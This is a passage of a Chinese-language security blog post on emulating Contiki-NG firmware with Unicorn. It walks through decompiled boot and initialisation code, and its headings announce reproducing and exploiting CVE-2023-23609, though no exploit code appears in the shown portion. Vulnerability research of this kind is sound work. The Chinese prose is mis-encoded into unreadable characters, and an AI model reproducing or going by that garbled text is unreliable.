<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Contiki Re-hosting å°è®° - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="Contiki Re-hosting å°è®°" />
<meta property="og:description" content="æœ¬æ–‡è®°å½•å¦‚ä½•ç”¨ Unicorn æ¨¡æ‹Ÿæ‰§è¡Œæ“ä½œç³»ç»Ÿ Contiki-NGï¼Œå¹¶åœ¨ä¸Šé¢å¤ç°å¹¶åˆ©ç”¨ CVE-2023-23609 çš„æ•…äº‹ã€‚" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://xidoo.top/2023/09/re-host/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-27T20:25:19+02:00" />
<meta property="article:modified_time" content="2023-09-27T20:25:19+02:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://xidoo.top/logo.png"/>

<meta name="twitter:title" content="Contiki Re-hosting å°è®°"/>
<meta name="twitter:description" content="æœ¬æ–‡è®°å½•å¦‚ä½•ç”¨ Unicorn æ¨¡æ‹Ÿæ‰§è¡Œæ“ä½œç³»ç»Ÿ Contiki-NGï¼Œå¹¶åœ¨ä¸Šé¢å¤ç°å¹¶åˆ©ç”¨ CVE-2023-23609 çš„æ•…äº‹ã€‚"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2023/09/re-host/" /><link rel="prev" href="http://xidoo.top/2023/05/rev_main/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Contiki Re-hosting å°è®°",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/xidoo.top\/2023\/09\/re-host\/"
        },"genre": "posts","wordcount":  3384 ,
        "url": "http:\/\/xidoo.top\/2023\/09\/re-host\/","datePublished": "2023-09-27T20:25:19+02:00","dateModified": "2023-09-27T20:25:19+02:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "x1do0"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Stay Hungry">ğŸš© Stay hungry</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Stay Hungry">ğŸš© Stay hungry</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Contiki Re-hosting å°è®°</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/general/"><i class="far fa-folder fa-fw"></i>General</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-09-27">2023-09-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3384 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;16 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#binary-åˆ†æ">binary åˆ†æ</a>
      <ul>
        <li>
          <ul>
            <li><a href="#arm-cortex-m3-boot">ARM Cortex-M3 boot</a></li>
            <li><a href="#main">main</a></li>
            <li><a href="#ä¸€äº›é¢˜å¤–è¯">ä¸€äº›é¢˜å¤–è¯ï¼Ÿ</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#dma">DMA</a></li>
                    <li><a href="#ä¸­æ–­">ä¸­æ–­</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#re-host">Re-host</a>
      <ul>
        <li>
          <ul>
            <li><a href="#å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#extract-raw-binary">extract raw binary</a></li>
                    <li><a href="#arm-cortex-m3-memory-layout">ARM Cortex-M3 memory layout</a></li>
                    <li><a href="#å¦‚ä½•æ¨¡æ‹Ÿä¸­æ–­">å¦‚ä½•æ¨¡æ‹Ÿä¸­æ–­</a></li>
                    <li><a href="#å¦‚ä½•æ¨¡æ‹Ÿç¡¬ä»¶">å¦‚ä½•æ¨¡æ‹Ÿç¡¬ä»¶</a></li>
                    <li><a href="#å¦‚ä½•è·³è¿‡æŸäº›å‡½æ•°">å¦‚ä½•è·³è¿‡æŸäº›å‡½æ•°ï¼Ÿ</a></li>
                  </ul>
                </li>
              </ul>
            </li>
            <li><a href="#æ¨¡æ‹Ÿç¨‹åºå¹¶äº§ç”Ÿä¸€ä¸ª-reset-ä¸­æ–­">æ¨¡æ‹Ÿç¨‹åºï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª reset ä¸­æ–­</a></li>
            <li><a href="#è§¦å‘æ›´å¤šä¸­æ–­å¤ç°-cve-2023-23609">è§¦å‘æ›´å¤šä¸­æ–­ï¼Œå¤ç° CVE-2023-23609</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#å¦‚ä½•èµ°åˆ°æ¼æ´å‡½æ•°">å¦‚ä½•èµ°åˆ°æ¼æ´å‡½æ•°</a></li>
                    <li><a href="#å¦‚ä½•è§¦å‘æ¼æ´">å¦‚ä½•è§¦å‘æ¼æ´</a></li>
                    <li><a href="#æ§åˆ¶-pc">æ§åˆ¶ PC</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#ç»“æŸäº†å—">ç»“æŸäº†å—ï¼Ÿ</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>æœ¬æ–‡è®°å½•å¦‚ä½•ç”¨ Unicorn æ¨¡æ‹Ÿæ‰§è¡Œæ“ä½œç³»ç»Ÿ Contiki-NGï¼Œå¹¶åœ¨ä¸Šé¢å¤ç°å¹¶åˆ©ç”¨ CVE-2023-23609 çš„æ•…äº‹ã€‚</p>
<h2 id="binary-åˆ†æ">binary åˆ†æ</h2>
<p>è¿™ä¸ª <a href="../../../file/hello-world.elf" rel="">binary</a> æ˜¯ä¸€ä¸ªå›ºä»¶ï¼ˆOSï¼‰ï¼Œå¹¶ä¸æ˜¯ä»¥å‰åˆ†æçš„åº”ç”¨ç¨‹åºï¼Œæ‰€ä»¥éœ€è¦æ”¹å˜è§†è§’ï¼Œå¯¹ä»£ç ä¸­å‡ºç°çš„æ“ä½œç³»ç»Ÿå±‚é¢çš„å·¥ä½œè¦æ•æ„Ÿç‚¹ã€‚</p>
<h4 id="arm-cortex-m3-boot">ARM Cortex-M3 boot</h4>
<p>æ—¢ç„¶å®ƒæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œé‚£ä¹ˆåœ¨ boot çš„æ—¶å€™å°±å¿…é¡»éµå®ˆ ARM Cortex-M3 å¹³å°çš„è§„åˆ™ã€‚å¤ä¹ ä¸€ä¸‹ç³»ç»Ÿè¯¾ä¸­å­¦åˆ°çš„ x86 æ“ä½œç³»ç»Ÿçš„å¯åŠ¨è¿‡ç¨‹ï¼šæŒ‰ä¸‹ç”µæºï¼ŒBOIS æŠŠç¡¬ç›˜ä¸­çš„å¯åŠ¨æ‰‡åŒºæ¬åˆ°å†…å­˜çš„ 0xFFFFFFF0 ï¼ˆæˆ–æ˜¯æ›´è€³ç†Ÿçš„ 0x7C00ï¼‰å¤„ï¼Œå¼€å§‹ä»è¿™ä¸ªåœ°å€æ‰§è¡Œã€‚</p>
<p>åœ¨ ARM Cortex-M3 ä¸­ï¼Œä¸­æ–­å‘é‡è¡¨ä¼šè¢«æ˜ å°„åˆ° 0 åœ°å€å¤„ï¼Œboot ä»£ç åšäº†è¿™äº›äº‹æƒ…ï¼šå» 0 åœ°å€å¤„æ£€ç´¢è¿™ä¸ªè¡¨ï¼Œå°†ç¬¬ä¸€ä¸ªè¡¨é¡¹çš„å€¼èµ‹ç»™ spï¼Œç¬¬äºŒä¸ªè¡¨é¡¹ï¼ˆä¹Ÿå°±æ˜¯ reset handlerï¼‰çš„å€¼èµ‹ç»™ ipã€‚è¿™æ ·çš„ç›®çš„æ˜¯ reset handler å¯ä»¥ç”¨ C å†™ï¼Œå› ä¸ºåœ¨ reset handler æ—¶æ ˆå·²ç»åˆå§‹åŒ–å¥½äº†ã€‚å‚è§ <a href="https://developer.arm.com/documentation/ka001328/latest/" target="_blank" rel="noopener noreffer">arm å®˜æ–¹ docs</a> ä¸ <a href="https://stackoverflow.com/questions/6139952/what-is-the-booting-process-for-arm" target="_blank" rel="noopener noreffer">what-is-the-booting-process-for-arm</a>ã€‚</p>
<p><code>_text</code> èµ·å§‹å¤„ï¼ˆ0x00202000ï¼‰å°±æ˜¯ä¸­æ–­å‘é‡è¡¨ï¼ˆä¸­æ–­å‘é‡è¡¨æ¯ä¸ªè¡¨é¡¹æ˜¯ä»€ä¹ˆï¼Œåœ¨å¹³å°ä¸Šæ˜¯æœ‰<a href="https://developer.arm.com/documentation/dui0552/a/the-cortex-m3-processor/exception-model/vector-table?lang=en" target="_blank" rel="noopener noreffer">è§„å®š</a>çš„ï¼‰ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªè¡¨é¡¹æ˜¯ <code>_end</code>ï¼Œç¬¬äºŒä¸ªè¡¨é¡¹æ˜¯ <code>reset_handler</code>ï¼Œå°è¯äº†å‰é¢çš„è¯´æ³•ã€‚ç‚¹å¼€ <code>reset_handler</code> å‘ç°å®ƒæ˜¯è¿™æ ·çš„ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">reset_handler</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// r1
</span><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// r2
</span><span class="c1"></span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x400D20B4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ble_l2cap_tx_process</span><span class="p">,</span> <span class="mh">0x214920</span><span class="p">,</span> <span class="mh">0x362u</span><span class="p">);</span>  <span class="c1">// data
</span><span class="c1"></span>  <span class="n">v0</span> <span class="o">=</span> <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rt_ticks_epoch</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x29EC</span><span class="p">);</span>          <span class="c1">// bss
</span><span class="c1"></span>  <span class="n">main</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆç–‘ä¼¼æ˜¯å°†ä»€ä¹ˆå¯„å­˜å™¨è®¾ç½®ä¸º 255. ç„¶åä¸€ä¸ª memcpy ä¸€ä¸ª memsetã€‚ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œ<code>ble_l2cap_tx_process</code> å…¶å®æ˜¯ <code>.data</code> çš„èµ·å§‹å¤„ï¼Œ<code>rt_ticks_epoch</code> æ˜¯ <code>.bss</code> çš„èµ·å§‹å¤„ã€‚æ‰€ä»¥å…¶å®æ˜¯ä» flashï¼ˆæ˜ å°„åˆ°åœ°å€ç©ºé—´ <code>0x214920</code>ï¼‰ é‡ŒæŠŠæ•°æ®æ‹·è´åˆ° <code>.data</code> æ®µï¼Œå¹¶ä¸”æŠŠ <code>.bss</code> æ®µæ¸…é›¶ã€‚</p>
<blockquote>
<p>mqa: å¹³æ—¶è¯´çš„æŠŠä»£ç çƒ§è¿›æ¿å­ï¼Œå…¶å®æ˜¯æ‹·è´è¿› flashï¼ˆå¤–éƒ¨å­˜å‚¨å™¨ï¼Œç±»ä¼¼äºç¡¬ç›˜ï¼‰ã€‚åµŒå…¥å¼ç³»ç»Ÿæ¯”è¾ƒç¥å¥‡çš„ä¸€ä¸ªç‚¹æ˜¯ï¼Œä»£ç å¯ä»¥ç›´æ¥åœ¨ flash é‡Œè¿è¡Œï¼ˆå¯ä»¥æƒ³è±¡æˆä»£ç å¯ä»¥ç›´æ¥åœ¨ç¡¬ç›˜é‡Œè·‘ï¼‰ã€‚ä½†æ˜¯ç èƒ½ç›´æ¥è·‘ï¼Œæ•°æ®æ®µè¿˜æ˜¯å¾—æ”¾è¿›å†…å­˜é‡Œï¼Œæ‰€ä»¥éœ€è¦æŠŠæ•°æ®æ®µä» flash é‡Œæ‹·è´è¿›æ¥ã€‚è‡³äºæ¸…é›¶ .bss æ®µå°±æ›´æ­£å¸¸äº†ï¼Œå› ä¸ºè¿™å°±æ˜¯æ“ä½œç³»ç»Ÿè¯¥å¹²çš„äº‹å„¿ï¼Œå®ƒä¸åƒ Linux å·²ç»æŠŠé¡µç®¡ç†æŠ½è±¡å¥½äº†ï¼Œ.bss æ®µåˆ†é…å‡ºæ¥å°±æ˜¯é›¶é¡µã€‚</p>
</blockquote>
<p>çœŸæ˜¯è±ç„¶å¼€æœ—ï¼Œè¿™æ ·æˆ‘ä»¬å°±èµ°åˆ°äº† main å‡½æ•°ã€‚</p>
<h4 id="main">main</h4>
<p>æ¥ä¸‹æ¥çœ‹çœ‹ main é‡Œå¹²äº†å•¥ï¼Œé¦–å…ˆå°±æ˜¯ä¸€å †ä¸æ˜æ‰€ä»¥çš„ç¡¬ä»¶ä¸è½¯ä»¶åˆå§‹åŒ–è¿‡ç¨‹ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">uip_ds6_addr_t</span> <span class="o">*</span><span class="n">link_local</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>
  <span class="n">platform_init_stage_one</span><span class="p">();</span>
  <span class="n">clock_init</span><span class="p">();</span>
  <span class="n">rtimer_init</span><span class="p">();</span>
  <span class="n">process_init</span><span class="p">();</span>
  <span class="n">process_start</span><span class="p">(</span><span class="o">&amp;</span><span class="n">etimer_process</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">ctimer_init</span><span class="p">();</span>
  <span class="n">watchdog_init</span><span class="p">();</span>
  <span class="n">energest_init</span><span class="p">();</span>
  <span class="n">stack_check_init</span><span class="p">();</span>
  <span class="n">platform_init_stage_two</span><span class="p">();</span>
  <span class="n">queuebuf_init</span><span class="p">();</span>
  <span class="n">netstack_init</span><span class="p">();</span>
  <span class="n">node_id_init</span><span class="p">();</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>æ²¡æœ‰å¤ªå¤šè¯´æ³•ï¼Œç¨å¾®è¯´è¯´çŸ¥é“çš„ä¸œè¥¿ï¼ˆä¸»è¦æ˜¯çŸ¥é“çš„ä¸œè¥¿ä¹Ÿä¸å¤šï¼‰ã€‚watchdog æ˜¯ç¡¬ä»¶ã€‚ç„¶å <code>platform_init_stage_one</code> ç‚¹è¿›å»æœ‰ä¸€ä¸ª <code>soc_init</code>ï¼Œè‡ªå¦‚å…¶åå°±æ˜¯ System of Chips åˆå§‹åŒ–ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">soc_init</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">nvic_init</span><span class="p">();</span>
  <span class="n">ioc_init</span><span class="p">();</span>
  <span class="n">sys_ctrl_init</span><span class="p">();</span>
  <span class="n">clock_init</span><span class="p">();</span>
  <span class="n">lpm_init</span><span class="p">();</span>
  <span class="n">rtimer_init</span><span class="p">();</span>
  <span class="n">gpio_hal_init</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>é‡Œé¢ <code>nvic_init</code> æ˜¯æŠŠä¸­æ–­å‘é‡è¡¨å¤´èµ‹å€¼ç»™ä¸€ä¸ª NVIC å¯„å­˜å™¨ï¼ˆå†…å­˜æ˜ å°„åˆ°äº† 0xE000ED08ï¼‰ï¼Œå…·ä½“æ˜¯å“ªä¸ªå¯„å­˜å™¨éƒ½å¯ä»¥åœ¨ CorTex-M3 æ‰‹å†Œé‡ŒæŸ¥åˆ°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">nvic_init</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000ED08</span><span class="p">]</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ioc ä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„ç¼©å†™ï¼Œlpm ä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„ç¼©å†™ï¼Œgpio_hal æŒ‡çš„æ˜¯ gpio ç¡¬ä»¶æŠ½è±¡å±‚ï¼ˆä¸€èˆ¬æ˜¯ä¸åŒç¡¬ä»¶å‚å•†é€ å‡ºæ¥çš„ä¸€å±‚æŠ½è±¡ï¼Œä½¿å¾—ä¸Šå±‚æ¥å£ä¸€è‡´ï¼Œå¹¶æ— éœ€å…³å¿ƒä¸‹å±‚ç¡¬ä»¶ç»†èŠ‚ï¼‰ã€‚gpio æ˜¯ä»€ä¹ˆä¸çŸ¥é“ã€‚</p>
<p>åæ­£ä¸€ç³»åˆ—åˆå§‹åŒ–ä»¥åï¼Œå›ºä»¶æ‰“å°å‡ºç‰ˆæœ¬ä¿¡æ¯ <code>Starting Contiki-NG-release/v4.9-11-gfd7139694</code> ç­‰ã€‚ç„¶åæ¥åˆ†æä¸€ä¸‹å®ƒæ‰§è¡Œäº†å“ªäº›ä¸œè¥¿ã€‚</p>
<p>æœ€å¼€å§‹çš„ä¸€ä¸ª <code>process_start</code> å¯åŠ¨çš„æ˜¯ tcpip_processã€‚åç»­ <code>autostart_start</code> æŒ¨ä¸ªå„¿å¯åŠ¨çš„ <code>autostart_processes</code> åˆ—è¡¨é‡Œçš„è¿›ç¨‹ï¼Œå®é™…ä¸Šé‡Œé¢å°±ä¸€ä¸ª hello_world_processã€‚è¿™ä¸¤ä¸ª process éƒ½ç”±ä¸€ä¸ªç»“æ„ä½“è¡¨ç¤ºï¼Œæˆå‘˜å˜é‡é‡Œè®°å½•äº† entry pointï¼Œå¯¹åº”åœ°å€å°±æ˜¯è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œå…·ä½“å¦‚ä¸‹ï¼Œä¸æ˜æ‰€ä»¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_hello_world_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">etimer_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">,</span> <span class="mh">0x500u</span><span class="p">);</span>
    <span class="k">goto</span> <span class="n">LABEL_6</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">==</span> <span class="mi">60</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">etimer_expired</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">)</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">etimer_reset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">);</span>
<span class="nl">LABEL_6</span><span class="p">:</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hello, world&#34;</span><span class="p">);</span>
    <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">60</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_tcpip_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">tcpip_event</span> <span class="o">=</span> <span class="n">process_alloc_event</span><span class="p">();</span>
    <span class="n">etimer_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">periodic_0</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">);</span>
    <span class="n">uip_init</span><span class="p">();</span>
    <span class="n">init_1</span><span class="p">();</span>
    <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">==</span> <span class="mi">833</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">eventhandler</span><span class="p">(</span><span class="n">ev</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="nl">LABEL_4</span><span class="p">:</span>
    <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">833</span><span class="p">;</span>
